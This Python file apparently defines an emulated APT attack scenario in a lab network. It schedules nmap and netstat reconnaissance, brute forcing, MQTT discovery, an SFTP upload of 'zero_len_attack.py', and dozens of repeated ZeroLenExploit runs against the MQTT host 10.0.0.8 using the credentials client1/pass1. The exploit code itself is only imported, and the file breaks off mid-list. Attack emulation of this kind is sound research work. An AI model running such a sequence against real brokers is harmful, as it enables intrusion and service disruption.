from APT import *

step_seq = [(NetstatRecStep(0), 1), (PauseStep(10),),
            (Nmap192T4RecStep(0),), (PauseStep(10),),
            (Nmap10T5RecStep(0), 1), (PauseStep(10),),
            (NetstatRecStep(0), 1), (PauseStep(10),),
            (Nmap192T4RecStep(0),), (PauseStep(10),),
            (Nmap10T5RecStep(0), 1
             ), (PauseStep(10),), (NetstatRecStep(0), 1
                                   ), (PauseStep(10),),
            (Nmap192T4RecStep(0),), (PauseStep(10),),
            (Nmap10T5RecStep(0), 1
             ), (PauseStep(10),), (NetstatRecStep(0), 1
                                   ), (PauseStep(10),),
            (Nmap192T4RecStep(0),), (PauseStep(10),),
            (Nmap10T5RecStep(0), 1
             ), (PauseStep(10),),
            (BruteForceStep(0, host="10.0.0.8"), 1
             ), (PauseStep(10),),
            (NmapMQTTDiscStep("10.0.0.8", pause=0), 1
             ), (PauseStep(10),),
            (NmapBannerDiscStep("10.0.0.8", pause=0), 1
             ), (PauseStep(10),), (MqttCatDiscStep("10.0.0.8", pause=0), 1
                                   ),
            (PauseStep(10),),
            (NmapSubDiscStep("10.0.0.8", pause=0), 1
             ), (PauseStep(10),), (PauseStep(180),), (PauseStep(10),),
            (NmapMQTTDiscStep("10.0.0.8", pause=0), 1
             ), (PauseStep(10),),
            (NmapBannerDiscStep("10.0.0.8", pause=0), 1
             ), (PauseStep(10),), (MqttCatDiscStep("10.0.0.8", pause=0), 1
                                   ),
            (PauseStep(10),),
            (NmapSubDiscStep("10.0.0.8", pause=0), 1
             ), (PauseStep(10),), (PauseStep(180),), (PauseStep(10),),
            (NmapMQTTDiscStep("10.0.0.8", pause=0), 1
             ), (PauseStep(10),),
            (NmapBannerDiscStep("10.0.0.8", pause=0), 1
             ), (PauseStep(10),), (MqttCatDiscStep("10.0.0.8", pause=0), 1
                                   ),
            (PauseStep(10),),
            (NmapSubDiscStep("10.0.0.8", pause=0), 1
             ), (PauseStep(10),), (PauseStep(180),), (PauseStep(10),),
            (NmapMQTTDiscStep("10.0.0.8", pause=0), 1
             ), (PauseStep(10),),
            (NmapBannerDiscStep("10.0.0.8", pause=0), 1
             ), (PauseStep(10),), (MqttCatDiscStep("10.0.0.8", pause=0), 1
                                   ),
            (PauseStep(10),),
            (NmapSubDiscStep("10.0.0.8", pause=0), 1
             ), (PauseStep(10),), (PauseStep(180),), (PauseStep(10),),
            (SftpInstStep("10.0.0.8", ["/zero_len_attack.py", "/mqtt_utilities.py"], pause=0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),), (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
                                   ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),), (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
                                   ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),), (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
                                   ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),), (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
                                   ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),), (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
                                   ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),), (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
                                   ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),), (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
                                   ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),), (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
                                   ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),), (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
                                   ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),), (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
                                   ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),), (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
                                   ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),), (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
                                   ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),), (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
                                   ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),), (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
                                   ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),), (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
                                   ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),), (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
                                   ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),), (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
                                   ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),), (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
                                   ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),), (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
                                   ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),), (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
                                   ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),), (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
                                   ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),), (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
                                   ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),), (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
                                   ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),), (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
                                   ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),), (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
                                   ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),), (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
                                   ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),), (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
                                   ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),), (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
                                   ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),), (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
                                   ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),), (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
                                   ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),), (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
                                   ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),), (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
                                   ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),), (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
                                   ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),), (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
                                   ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),), (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
                                   ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),), (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
                                   ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),), (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
                                   ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),), (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
                                   ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),), (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
                                   ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),), (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
                                   ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),), (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
                                   ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),), (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
                                   ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),), (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
                                   ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),), (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
                                   ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),), (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
                                   ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),), (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
                                   ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),), (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
                                   ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),), (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
                                   ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),), (PauseStep(10),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),), (NmapSubDiscStep("10.0.0.8", pause=0), 1
                                                      ), (PauseStep(10),), (PauseStep(180),), (PauseStep(10),),
            (SftpInstStep("10.0.0.8", ["/zero_len_attack.py", "/mqtt_utilities.py"], pause=0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),), (PauseStep(10),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),), (NmapSubDiscStep("10.0.0.8", pause=0), 1
                                                      ), (PauseStep(10),), (PauseStep(180),), (PauseStep(10),),
            (SftpInstStep("10.0.0.8", ["/zero_len_attack.py", "/mqtt_utilities.py"], pause=0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),), (PauseStep(10),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),), (NmapSubDiscStep("10.0.0.8", pause=0), 1
                                                      ), (PauseStep(10),), (PauseStep(180),), (PauseStep(10),),
            (SftpInstStep("10.0.0.8", ["/zero_len_attack.py", "/mqtt_utilities.py"], pause=0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
